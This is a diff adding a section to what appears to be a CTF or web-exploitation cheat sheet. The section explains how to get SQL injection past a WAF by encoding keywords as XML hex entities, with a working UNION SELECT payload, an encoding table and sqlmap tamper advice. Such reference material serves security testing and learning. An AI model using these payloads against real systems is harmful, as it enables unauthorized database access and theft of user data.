@@ -10,6 +10,7 @@
   - [SQLi LIKE Character Brute-Force](#sqli-like-character-brute-force)
   - [SQLi → SSTI Chain](#sqli-ssti-chain)
   - [MySQL information_schema.processList Trick](#mysql-information_schemaprocesslist-trick)
+  - [WAF Bypass via XML Entity Encoding (Crypto-Cat)](#waf-bypass-via-xml-entity-encoding-crypto-cat)
 - [SSTI (Server-Side Template Injection)](#ssti-server-side-template-injection)
   - [Jinja2 RCE](#jinja2-rce)
   - [Go Template Injection](#go-template-injection)
@@ -186,6 +187,27 @@ hex_payload = '0x' + payload.encode().hex()
 SELECT info FROM information_schema.processList WHERE id=connection_id()
 SELECT substring(info, 315, 579) FROM information_schema.processList WHERE id=connection_id()
 ```
+
+### WAF Bypass via XML Entity Encoding (Crypto-Cat)
+When SQL keywords (`UNION`, `SELECT`) are blocked by a WAF, encode them as XML hex character references. The XML parser decodes entities before the SQL engine processes the query:
+```xml
+<storeId>
+  1 &#x55;&#x4e;&#x49;&#x4f;&#x4e; &#x53;&#x45;&#x4c;&#x45;&#x43;&#x54; username &#x46;&#x52;&#x4f;&#x4d; users
+</storeId>
+```
+This decodes to `1 UNION SELECT username FROM users` after XML processing.
+
+**Encoding reference:**
+| Keyword | XML Hex Entities |
+|---------|-----------------|
+| UNION | `&#x55;&#x4e;&#x49;&#x4f;&#x4e;` |
+| SELECT | `&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;` |
+| FROM | `&#x46;&#x52;&#x4f;&#x4d;` |
+| WHERE | `&#x57;&#x48;&#x45;&#x52;&#x45;` |
+
+**Key insight:** WAF inspects raw XML bytes and blocks keyword patterns, but the XML parser decodes `&#xNN;` entities before passing values to the SQL layer. Any endpoint accepting XML input (SOAP, REST with XML body, stock check APIs) is a candidate.
+
+**With sqlmap:** Use the `hexentities` tamper script. To prevent `&amp;` double-encoding of entities, modify `sqlmap/lib/request/connect.py`.
 
 ---
 
